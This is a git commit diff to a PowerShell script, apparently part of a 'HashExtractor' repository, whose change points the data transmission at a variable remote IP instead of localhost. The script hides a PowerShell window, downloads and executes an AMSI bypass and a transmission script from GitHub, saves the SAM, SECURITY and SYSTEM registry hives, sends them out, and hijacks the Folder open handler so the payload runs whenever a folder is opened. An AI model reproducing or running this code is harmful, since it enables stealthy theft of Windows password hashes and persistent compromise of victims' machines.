be4282e9ed08c5a2cd564052fad321edc318fa1d
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-13 01:30:32 +0200

    Update DoTheThing-Template.ps1

--- DoTheThing-Template.ps1
+++ DoTheThing-Template.ps1
@@ -1,5 +1,5 @@
 
-$Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX `$a;`$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;"# | Out-String | Invoke-Transmission -ip localhost
+$Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX `$a;`$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;Invoke-Transmission -ip $ip"
 [System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
 New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
 New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
